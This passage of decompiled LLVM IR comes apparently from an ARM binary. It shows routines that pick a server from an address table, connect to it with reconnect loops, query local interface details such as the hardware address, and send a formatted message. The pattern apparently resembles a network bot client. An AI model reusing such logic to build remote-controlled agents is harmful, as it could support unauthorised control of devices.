  uselistorder i32 %v2_10f34, { 2, 1, 0 }
  uselistorder i32 %v1_10e8c, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10e30, { 1, 0 }
  uselistorder i32 %v1_10e1c, { 1, 0 }
  uselistorder i32 %v1_10e00, { 1, 0 }
  uselistorder i32 %v2_10de8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10d74, { 1, 0 }
  uselistorder i32 %v1_10d54, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 1, 2, 3, 4, 5, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @function_109f0, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10330, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_224b0.588 to i32), { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32* @global_var_32af4.612, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_21308.38 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_11430, { 18, 5, 4, 7, 3, 0, 8, 9, 2, 1, 10, 11, 12, 13, 15, 6, 14, 16, 17 }
  uselistorder label %dec_label_pc_113b4, { 1, 0 }
  uselistorder label %dec_label_pc_113a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11324, { 1, 0 }
  uselistorder label %dec_label_pc_112f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1121c, { 1, 0 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
  uselistorder label %dec_label_pc_110f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_110ac, { 1, 0 }
  uselistorder label %dec_label_pc_11084, { 1, 0 }
  uselistorder label %dec_label_pc_10f94, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10de0, { 1, 0 }
  uselistorder label %dec_label_pc_10d18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c2c, { 1, 0 }
}

define i32 @function_11490() local_unnamed_addr {
dec_label_pc_11490:
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_11494 = load i32, i32* @fp, align 4
  store i32 70812, i32* %stack_var_-4, align 4
  %v2_11498 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11498, i32* @fp, align 4
  %v2_114a8 = ptrtoint i32* %stack_var_-4112 to i32
  store i32 4096, i32* @r2, align 4
  %v2_114b8 = bitcast i32* %stack_var_-4112 to i8*
  %v3_114b8 = call i32 @function_13ed0(i8* %v2_114b8, i32 0)
  %v2_114c0 = load i32, i32* @global_var_2c890.36, align 4
  %v2_114c4 = icmp eq i32 %v2_114c0, 0
  br i1 %v2_114c4, label %dec_label_pc_114e8, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_11490
  %v1_114d8 = call i32 @function_12a98(i32 %v2_114c0)
  store i32 0, i32* @global_var_2c890.36, align 4
  br label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_11490, %dec_label_pc_114cc
  %v2_114ec = load i32, i32* inttoptr (i32 181768 to i32*), align 8
  %v2_114f0 = icmp eq i32 %v2_114ec, 0
  br i1 %v2_114f0, label %dec_label_pc_1151c, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_114e8
  %v2_1150c = load i32, i32* inttoptr (i32 181768 to i32*), align 8
  %v1_11510 = add i32 %v2_1150c, 1
  br label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_114e8, %dec_label_pc_11508
  %storemerge1 = phi i32 [ %v1_11510, %dec_label_pc_11508 ], [ 0, %dec_label_pc_114e8 ]
  store i32 %storemerge1, i32* inttoptr (i32 181768 to i32*), align 8
  %v4_11530 = mul i32 %storemerge1, 4
  %v5_11530 = add i32 %v4_11530, 180392
  %v6_11530 = inttoptr i32 %v5_11530 to i32*
  %v7_11530 = load i32, i32* %v6_11530, align 4
  store i32 %v7_11530, i32* @r1, align 4
  %v3_1153c = call i32 @function_14210(i8* %v2_114b8, i32 %v7_11530)
  store i32 %v2_114a8, i32* @r0, align 4
  %v2_11550 = call i32 @function_142f0(i32 %v2_114a8, i32 58)
  %v2_11558 = icmp eq i32 %v2_11550, 0
  br i1 %v2_11558, label %dec_label_pc_115b4, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_1151c
  store i32 %v2_114a8, i32* @r0, align 4
  %v2_11570 = call i32 @function_142f0(i32 %v2_114a8, i32 58)
  %v1_11578 = add i32 %v2_11570, 1
  store i32 %v1_11578, i32* @r0, align 4
  %v1_11580 = call i32 @function_161fc(i32 %v1_11578)
  store i32 %v1_11580, i32* inttoptr (i32 180396 to i32*), align 4
  store i32 %v2_114a8, i32* @r0, align 4
  %v2_115a0 = call i32 @function_142f0(i32 %v2_114a8, i32 58)
  %v3_115b0 = inttoptr i32 %v2_115a0 to i8*
  store i8 0, i8* %v3_115b0, align 1
  br label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %dec_label_pc_1151c, %dec_label_pc_11560
  %v3_115c0 = call i32 @function_14a84(i32 2, i32 1, i32 0)
  store i32 %v3_115c0, i32* @global_var_2c890.36, align 4
  %v2_115e4 = load i32, i32* inttoptr (i32 180396 to i32*), align 4
  %v4_115f4 = call i32 @function_a38c(i32 %v3_115c0, i32 %v2_114a8, i32 %v2_115e4, i32 30)
  %v2_115fc = icmp eq i32 %v4_115f4, 0
  %. = zext i1 %v2_115fc to i32
  store i32 %v3_11494, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_114a8, { 0, 2, 1, 4, 3, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_115b4, { 1, 0 }
  uselistorder label %dec_label_pc_1151c, { 1, 0 }
  uselistorder label %dec_label_pc_114e8, { 1, 0 }
}

define i32 @function_1163c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1163c:
  %v0_1163c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1163c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1163c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1163c, %bb
  %v7_11644 = load i32, i32* @r0, align 4
  ret i32 %v7_11644

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11648(i32 %arg1) local_unnamed_addr {
dec_label_pc_11648:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1164c = load i32, i32* @fp, align 4
  store i32 %v3_1164c, i32* %stack_var_-16, align 4
  %v3_11668 = call i32 @function_14a84(i32 2, i32 2, i32 0)
  %v3_11678 = icmp eq i32 %v3_11668, -1
  br i1 %v3_11678, label %dec_label_pc_11680, label %dec_label_pc_11690

dec_label_pc_11680:                               ; preds = %dec_label_pc_11648
  br label %dec_label_pc_118cc

dec_label_pc_11690:                               ; preds = %dec_label_pc_11648
  %v2_11690 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_116a0 = bitcast i32* %stack_var_-52 to i8*
  %v3_116a0 = call i32 @function_13ed0(i8* %v2_116a0, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22550.642 to i32), i32* @r0, align 4
  %v2_116b0 = call i32 @function_14830(i32 ptrtoint ([8 x i8]* @global_var_22550.642 to i32))
  %v1_116c0 = call i32 @function_1464c(i32 53)
  %v3_116dc = call i32 @function_148dc(i32 %v3_11668, i32 %v2_11690, i32 16)
  %v3_116ec = icmp eq i32 %v3_116dc, -1
  br i1 %v3_116ec, label %dec_label_pc_116f4, label %dec_label_pc_11704

dec_label_pc_116f4:                               ; preds = %dec_label_pc_11690
  br label %dec_label_pc_118cc

dec_label_pc_11704:                               ; preds = %dec_label_pc_11690
  store i32 16, i32* %stack_var_-72, align 4
  %v2_1170c = ptrtoint i32* %stack_var_-68 to i32
  %v2_11710 = ptrtoint i32* %stack_var_-72 to i32
  %v5_1171c = call i32 @function_14914(i32 %v3_11668, i32 %v2_1170c, i32 %v2_11710, i32 %v2_1170c, i32 16)
  %v3_1172c = icmp eq i32 %v5_1171c, -1
  br i1 %v3_1172c, label %dec_label_pc_11734, label %dec_label_pc_11744

dec_label_pc_11734:                               ; preds = %dec_label_pc_11704
  br label %dec_label_pc_118cc

dec_label_pc_11744:                               ; preds = %dec_label_pc_11704
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_32aec.554 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_32aec.554, align 4
  %v3_11758 = call i32 @function_125b4(i32 ptrtoint ([16 x i8]* @global_var_22558.645 to i32), i32 0)
  %v2_117f0 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_117e8

dec_label_pc_11768:                               ; preds = %dec_label_pc_117e8
  %v4_1177c = call i32 @function_14020(i32 %v2_117f0, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22568.647, i32 0, i32 0))
  %v2_11784 = icmp eq i32 %v4_1177c, 0
  br i1 %v2_11784, label %dec_label_pc_117cc, label %dec_label_pc_117ac.preheader

dec_label_pc_117ac.preheader:                     ; preds = %dec_label_pc_11768
  %v2_117b09 = load i8, i8* %stack_var_-4168, align 1
  %v7_117b413 = icmp eq i8 %v2_117b09, 9
  br i1 %v7_117b413, label %dec_label_pc_117bc, label %dec_label_pc_117a0

dec_label_pc_117a0:                               ; preds = %dec_label_pc_117ac.preheader, %dec_label_pc_117a0
  %v4_117ac14 = phi i32 [ %v1_117a4, %dec_label_pc_117a0 ], [ %v2_117f0, %dec_label_pc_117ac.preheader ]
  %v1_117a4 = add i32 %v4_117ac14, 1
  %v5_117a8 = inttoptr i32 %v1_117a4 to i8*
  %v2_117b0 = load i8, i8* %v5_117a8, align 1
  %v7_117b4 = icmp eq i8 %v2_117b0, 9
  br i1 %v7_117b4, label %dec_label_pc_117bc, label %dec_label_pc_117a0

dec_label_pc_117bc:                               ; preds = %dec_label_pc_117a0, %dec_label_pc_117ac.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_117ac.preheader ], [ %v5_117a8, %dec_label_pc_117a0 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_11810

dec_label_pc_117cc:                               ; preds = %dec_label_pc_11768
  store i32 4096, i32* @r2, align 4
  %v3_117e4 = call i32 @function_13ed0(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_117e8

dec_label_pc_117e8:                               ; preds = %dec_label_pc_11744, %dec_label_pc_117cc
  %v4_11800 = call i32 @function_981c(i32 %v2_117f0, i32 4096, i32 %v3_11758, i32 %v2_117f0)
  %v2_11808 = icmp eq i32 %v4_11800, 0
  br i1 %v2_11808, label %dec_label_pc_11810, label %dec_label_pc_11768

dec_label_pc_11810:                               ; preds = %dec_label_pc_117e8, %dec_label_pc_117bc
  %v1_11814 = call i32 @function_12a98(i32 %v3_11758)
  %v4_11824 = load i8, i8* %stack_var_-4168, align 1
  %v2_11828 = icmp eq i8 %v4_11824, 0
  br i1 %v2_11828, label %dec_label_pc_118c0, label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_11810
  %v2_11838 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_117f0, i32* @r1, align 4
  %v2_11850 = bitcast i32* %stack_var_-4200 to i8*
  %v3_11850 = call i32 @function_14210(i8* %v2_11850, i32 %v2_117f0)
  store i32 %v2_11838, i32* @r3, align 4
  %v3_11870 = call i32 @function_129e0(i32 %v3_11668, i32 35111, i32 %v2_11838)
  %v2_11890 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_11880

dec_label_pc_11880:                               ; preds = %dec_label_pc_11830, %dec_label_pc_11880
  %storemerge47 = phi i32 [ 0, %dec_label_pc_11830 ], [ %v1_118ac, %dec_label_pc_11880 ]
  %v2_11898 = add i32 %storemerge47, %v2_11890
  %v1_1189c = inttoptr i32 %v2_11898 to i8*
  %v2_1189c = load i8, i8* %v1_1189c, align 1
  %v4_118a4 = add i32 %storemerge47, ptrtoint (i32* @global_var_2c8a0.649 to i32)
  %v5_118a4 = inttoptr i32 %v4_118a4 to i8*
  store i8 %v2_1189c, i8* %v5_118a4, align 1
  %v1_118ac = add nuw nsw i32 %storemerge47, 1
  %v7_118bc = icmp slt i32 %v1_118ac, 6
  br i1 %v7_118bc, label %dec_label_pc_11880, label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_11880, %dec_label_pc_11810
  %v1_118c4 = call i32 @function_12a98(i32 %v3_11668)
  %v3_118e0.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_118dc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_11734, %dec_label_pc_116f4, %dec_label_pc_11680
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118c0, %dec_label_pc_118cc
  %v3_118e0 = phi i32 [ %v3_118e0.pre, %dec_label_pc_118c0 ], [ 0, %dec_label_pc_118cc ]
  %v2_118e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_118e8, i32* @fp, align 4
  ret i32 %v3_118e0

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_117a4, { 1, 0 }
  uselistorder i32 %v2_117f0, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_11668, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1464c, { 7, 6, 5, 3, 2, 1, 0, 4 }
  uselistorder i32 (i32)* @function_14830, { 2, 1, 0 }
  uselistorder label %dec_label_pc_118dc, { 1, 0 }
  uselistorder label %dec_label_pc_11880, { 1, 0 }
  uselistorder label %dec_label_pc_117e8, { 1, 0 }
  uselistorder label %dec_label_pc_117a0, { 1, 0 }
}

define i32 @function_11904() local_unnamed_addr {
dec_label_pc_11904:
  ret i32 ptrtoint ([6 x i8]* @global_var_22574.651 to i32)
}

define i32 @function_11928() local_unnamed_addr {
dec_label_pc_11928:
  %v3_11940 = call i32 @function_12730(i32 ptrtoint ([16 x i8]* @global_var_2257c.653 to i32), i32 0)
  %v7_11948 = icmp eq i32 %v3_11940, -1
  %v4_11964 = select i1 %v7_11948, i32 ptrtoint ([7 x i8]* @global_var_22594.657 to i32), i32 ptrtoint ([7 x i8]* @global_var_2258c.655 to i32)
  ret i32 %v4_11964
}

define i32 @function_11984(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11984:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-1164 = alloca i32, align 4
  %stack_var_-5260 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 72080, i32* %stack_var_-4, align 4
  %v2_1198c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1198c, i32* @fp, align 4
  %v2_119a0 = ptrtoint i32* %stack_var_-32 to i32
  %v3_119c8 = call i32 @function_12730(i32 ptrtoint ([16 x i8]* @global_var_2257c.653 to i32), i32 0)
  store i32 %v3_119c8, i32* @r0, align 4
  %v7_119d0 = icmp eq i32 %v3_119c8, -1
  %. = select i1 %v7_119d0, i32 ptrtoint ([19 x i8]* @global_var_225a0.664 to i32), i32 ptrtoint ([5 x i8]* @global_var_208cc.662 to i32)
  %v0_119ec = call i32 @function_126cc()
  %v2_119f4 = icmp eq i32 %v0_119ec, 0
  br i1 %v2_119f4, label %dec_label_pc_119fc, label %dec_label_pc_11a08

dec_label_pc_119fc:                               ; preds = %dec_label_pc_11984
  store i32 0, i32* inttoptr (i32 181764 to i32*), align 4
  br label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11984, %dec_label_pc_119fc
  %v0_11a08 = call i32 @function_11928()
  %v2_11a24 = load i32, i32* %arg2, align 4
  store i32 %v2_11a24, i32* @r4, align 4
  %v2_11a3c = load i32, i32* %arg2, align 4
  store i32 %v2_11a3c, i32* @r0, align 4
  %v0_11a44 = call i32 @function_13f70()
  %v0_11a4c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2259c.659 to i32), i32* @r1, align 4
  %v3_11a58 = call i32 @function_14234(i32 %v0_11a4c, i32 ptrtoint (i32* @global_var_2259c.659 to i32), i32 %v0_11a44)
  %v2_11a6c = load i32, i32* %arg2, align 4
  store i32 %v2_11a6c, i32* @r0, align 4
  %v2_11a78 = call i32 @function_12b40(i32 %v2_11a6c, i32 %.)
  %v5_11a9c = call i32 @function_1268c(i32 15, i32 %., i32 0, i32 0, i32 0)
  %v2_11aa4 = call i32 @function_1265c(i32* null)
  store i32 %v2_11aa4, i32* @r0, align 4
  store i32 %v2_11aa4, i32* @r4, align 4
  %v0_11aac = call i32 @function_12648()
  %v0_11ab4 = load i32, i32* @r4, align 4
  %v2_11ab4 = xor i32 %v0_11ab4, %v0_11aac
  %v1_11abc = call i32 @function_15e28(i32 %v2_11ab4)
  %v2_11ac4 = call i32 @function_1265c(i32* null)
  store i32 %v2_11ac4, i32* @r0, align 4
  store i32 %v2_11ac4, i32* @r4, align 4
  %v0_11acc = call i32 @function_12648()
  %v0_11ad4 = load i32, i32* @r4, align 4
  %v2_11ad4 = xor i32 %v0_11ad4, %v0_11acc
  %v1_11adc = call i32 @function_8318(i32 %v2_11ad4)
  %v1_11ae0 = call i32 @function_11648(i32 %v1_11adc)
  store i32 %v1_11ae0, i32* @r0, align 4
  %v0_11ae4 = call i32 @function_126e0()
  store i32 %v0_11ae4, i32* @r0, align 4
  %v2_11af4 = icmp eq i32 %v0_11ae4, 0
  br i1 %v2_11af4, label %dec_label_pc_11b24, label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11a08
  %v2_11afc = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v0_11ae4, i32* @r0, align 4
  store i32 %v2_11afc, i32* @r1, align 4
  %v3_11b0c = call i32 @function_12714(i32 %v0_11ae4, i32 %v2_11afc, i32 0)
  %v1_11b14 = call i32 @function_163f8(i32 0)
  store i32 %v1_11b14, i32* @r0, align 4
  br label %dec_label_pc_11b44

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11a08
  %v0_11b24 = call i32 @function_126e0()
  store i32 %v0_11b24, i32* @r0, align 4
  %v2_11b34 = icmp eq i32 %v0_11b24, 0
  br i1 %v2_11b34, label %dec_label_pc_11b44, label %dec_label_pc_11b3c

dec_label_pc_11b3c:                               ; preds = %dec_label_pc_11b24
  %v1_11b40 = call i32 @function_163f8(i32 0)
  store i32 %v1_11b40, i32* @r0, align 4
  br label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b18, %dec_label_pc_11b24, %dec_label_pc_11b3c
  %v0_11b44 = call i32 @function_129ac()
  %v1_11b4c = call i32 @function_127a4(i32 ptrtoint (i32* @global_var_225b4.667 to i32))
  %v2_11b58 = call i32 @function_14b30(i32 13, i32 1)
  %v2_123a4 = ptrtoint i32* %stack_var_-5260 to i32
  %v4_123b4 = bitcast i32* %stack_var_-5260 to i8*
  %v1_11fd4 = or i32 %v2_123a4, 1
  %v2_12144 = ptrtoint i32* %stack_var_-1164 to i32
  %v2_12154 = bitcast i32* %stack_var_-1164 to i8*
  %v2_12364 = add i32 %v2_119a0, -108
  br label %dec_label_pc_11b5c

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b6c, %dec_label_pc_12394, %dec_label_pc_11b44
  %v0_11b5c = call i32 @function_11490()
  %v2_11b64 = icmp eq i32 %v0_11b5c, 0
  br i1 %v2_11b64, label %dec_label_pc_11b78, label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b5c
  %v1_11b70 = call i32 @function_164b0(i32 5)
  br label %dec_label_pc_11b5c

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b5c
  %v2_11b7c = load i32, i32* @global_var_2c890.36, align 4
  store i32 %v2_11b7c, i32* @r4, align 4
  %v0_11b80 = call i32 @function_11928()
  store i32 %v0_11b80, i32* @r5, align 4
  %v2_11b8c = load i32, i32* @global_var_32aec.554, align 4
  store i32 %v2_11b8c, i32* @r0, align 4
  %v1_11b90 = call i32 @function_14814(i32 %v2_11b8c)
  store i32 %v1_11b90, i32* @r6, align 4
  %v0_11b98 = call i32 @function_11904()
  %v0_11ba4 = load i32, i32* @r4, align 4
  %v0_11bac = load i32, i32* @r5, align 4
  store i32 %v0_11bac, i32* @r2, align 4
  %v3_11bb4 = call i32 @function_9340(i32 %v0_11ba4, i32 ptrtoint ([43 x i8]* @global_var_225b8.671 to i32))
  br label %dec_label_pc_12394

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11e8c, %dec_label_pc_11e30
  %v3_11bdc = mul i32 %v3_11e80, 4
  %v2_11be8 = load i32, i32* @global_var_32af8.45, align 4
  %v2_11bec = add i32 %v2_11be8, %v3_11bdc
  %v1_11bf0 = inttoptr i32 %v2_11bec to i32*
  %v2_11bf0 = load i32, i32* %v1_11bf0, align 4
  store i32 %v2_11bf0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_11c00 = call i32 @function_12714(i32 %v2_11bf0, i32 0, i32 1)
  %tmp97 = icmp slt i32 %v3_11c00, 1
  br i1 %tmp97, label %dec_label_pc_11e24, label %dec_label_pc_11c64

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11cb8, %dec_label_pc_11c64
  %v2_11c24 = load i32, i32* @global_var_32af8.45, align 4
  %v3_11c30 = mul i32 %v1_11c14, 4
  %v1_11c28 = add i32 %v3_11c30, -4
  %v2_11c34 = add i32 %v1_11c28, %v2_11c24
  %v2_11c4c = add i32 %v2_11c24, %v3_11c30
  %v1_11c50 = inttoptr i32 %v2_11c4c to i32*
  %v2_11c50 = load i32, i32* %v1_11c50, align 4
  %v2_11c54 = inttoptr i32 %v2_11c34 to i32*
  store i32 %v2_11c50, i32* %v2_11c54, align 4
  br label %dec_label_pc_11c64

dec_label_pc_11c64:                               ; preds = %dec_label_pc_11bd8, %dec_label_pc_11c20
  %v3_11c10.sink = phi i32 [ %v1_11c14, %dec_label_pc_11c20 ], [ %v3_11e80, %dec_label_pc_11bd8 ]
  %v1_11c14 = add i32 %v3_11c10.sink, 1
  %v2_11c7c = load i32, i32* @global_var_2c898.42, align 4
  %v5_11c7c = load i32, i32* @global_var_2c89c.43, align 4
  %tmp98 = icmp ugt i32 %v5_11c7c, %v1_11c14
  br i1 %tmp98, label %dec_label_pc_11c20, label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c64
  %v9_11cb0 = icmp eq i32 %v5_11c7c, %v1_11c14
  br i1 %v9_11cb0, label %dec_label_pc_11cb8, label %dec_label_pc_11cd0

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11ca0
  %v9_11cc8 = icmp eq i32 %v2_11c7c, 0
  br i1 %v9_11cc8, label %dec_label_pc_11cd0, label %dec_label_pc_11c20

dec_label_pc_11cd0:                               ; preds = %dec_label_pc_11cb8, %dec_label_pc_11ca0
  %v2_11cd4 = load i32, i32* @global_var_32af8.45, align 4
  %v3_11ce0 = mul i32 %v1_11c14, 4
  %v1_11cd8 = add i32 %v3_11ce0, -4
  %v2_11ce4 = add i32 %v1_11cd8, %v2_11cd4
  %v2_11cec = inttoptr i32 %v2_11ce4 to i32*
  store i32 0, i32* %v2_11cec, align 4
  %v2_11cf4 = load i32, i32* @global_var_2c898.42, align 4
  %v5_11cf4 = load i32, i32* @global_var_2c89c.43, align 4
  %v2_11d00 = add i32 %v2_11cf4, -1
  %v3_11d00 = icmp ne i32 %v2_11cf4, 0
  %v3_11d04 = add i32 %v5_11cf4, -1
  %v4_11d04 = zext i1 %v3_11d00 to i32
  %v5_11d04 = add i32 %v3_11d04, %v4_11d04
  store i32 %v2_11d00, i32* @global_var_2c898.42, align 4
  store i32 %v5_11d04, i32* @global_var_2c89c.43, align 4
  %v3_11d20 = icmp eq i32 %v2_11cf4, 0
  %v4_11d24 = zext i1 %v3_11d20 to i32
  %v5_11d24 = add i32 %v5_11d04, %v4_11d24
  %v3_11d28 = udiv i32 %v2_11cf4, 1073741824
  %v3_11d2c = mul i32 %v5_11d24, 4
  %v2_11d30 = or i32 %v3_11d2c, %v3_11d28
  store i32 %v2_11d30, i32* @r4, align 4
  %v3_11d34 = mul i32 %v2_11cf4, 4
  %v1_11d3c = call i32 @function_14ccc(i32 %v3_11d34)
  br label %dec_label_pc_11d94

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11df0, %dec_label_pc_11d94
  %v3_11d58 = mul i32 %v3_11de4, 4
  %v2_11d64 = add i32 %v3_11d58, %v1_11d3c
  %v2_11d78 = load i32, i32* @global_var_32af8.45, align 4
  %v2_11d7c = add i32 %v2_11d78, %v3_11d58
  %v1_11d80 = inttoptr i32 %v2_11d7c to i32*
  %v2_11d80 = load i32, i32* %v1_11d80, align 4
  %v2_11d84 = inttoptr i32 %v2_11d64 to i32*
  store i32 %v2_11d80, i32* %v2_11d84, align 4
  %v1_11d8c = add i32 %v3_11de4, 1
  br label %dec_label_pc_11d94

dec_label_pc_11d94:                               ; preds = %dec_label_pc_11cd0, %dec_label_pc_11d54
  %v3_11de4 = phi i32 [ 0, %dec_label_pc_11cd0 ], [ %v1_11d8c, %dec_label_pc_11d54 ]
  %v2_11db0 = load i32, i32* @global_var_2c898.42, align 4
  %v5_11db0 = load i32, i32* @global_var_2c89c.43, align 4
  %tmp100 = icmp ugt i32 %v5_11db0, %v3_11de4
  br i1 %tmp100, label %dec_label_pc_11d54, label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %dec_label_pc_11d94
  %v9_11de8 = icmp eq i32 %v5_11db0, %v3_11de4
  br i1 %v9_11de8, label %dec_label_pc_11df0, label %dec_label_pc_11e08

dec_label_pc_11df0:                               ; preds = %dec_label_pc_11dd8
  %v9_11e00 = icmp eq i32 %v2_11db0, 0
  br i1 %v9_11e00, label %dec_label_pc_11e08, label %dec_label_pc_11d54

dec_label_pc_11e08:                               ; preds = %dec_label_pc_11df0, %dec_label_pc_11dd8
  %v2_11e0c = load i32, i32* @global_var_32af8.45, align 4
  store i32 %v2_11e0c, i32* @r0, align 4
  %v0_11e14 = call i32 @function_15850()
  store i32 %v1_11d3c, i32* @global_var_32af8.45, align 4
  br label %dec_label_pc_11e24

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11bd8, %dec_label_pc_11e08
  %v1_11e28 = add i32 %v3_11e80, 1
  br label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_12394, %dec_label_pc_11e24
  %v3_11e80 = phi i32 [ %v1_11e28, %dec_label_pc_11e24 ], [ 0, %dec_label_pc_12394 ]
  %v3_11e38 = ashr i32 %v3_11e80, 31
  %v2_11e4c = load i32, i32* @global_var_2c898.42, align 4
  %v5_11e4c = load i32, i32* @global_var_2c89c.43, align 4
  %v3_11e6c = icmp uge i32 %v5_11e4c, %v3_11e80
  %v9_11e6c = icmp eq i32 %v5_11e4c, %v3_11e80
  %v2_11e70 = xor i1 %v9_11e6c, true
  %v3_11e70 = and i1 %v3_11e6c, %v2_11e70
  br i1 %v3_11e70, label %dec_label_pc_11bd8, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e30
  br i1 %v9_11e6c, label %dec_label_pc_11e8c, label %dec_label_pc_11ea4

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e74
  %tmp = icmp ugt i32 %v2_11e4c, %v3_11e38
  br i1 %tmp, label %dec_label_pc_11bd8, label %dec_label_pc_11ea4

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11e74, %dec_label_pc_11e8c
  %v2_11eb8 = add i32 %v5_123b4, %v2_123a4
  %v3_11ec0 = inttoptr i32 %v2_11eb8 to i8*
  store i8 0, i8* %v3_11ec0, align 1
  %v1_11ed4 = call i32 @function_89a8(i32 %v2_123a4)
  %v4_11eec = call i32 @function_14020(i32 %v2_123a4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21308.38, i32 0, i32 0))
  store i32 %v4_11eec, i32* @r2, align 4
  %v9_11f00 = icmp eq i32 %v4_11eec, %v2_123a4
  br i1 %v9_11f00, label %dec_label_pc_11f08, label %dec_label_pc_11f20

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11ea4
  %v2_11f0c = load i32, i32* @global_var_2c890.36, align 4
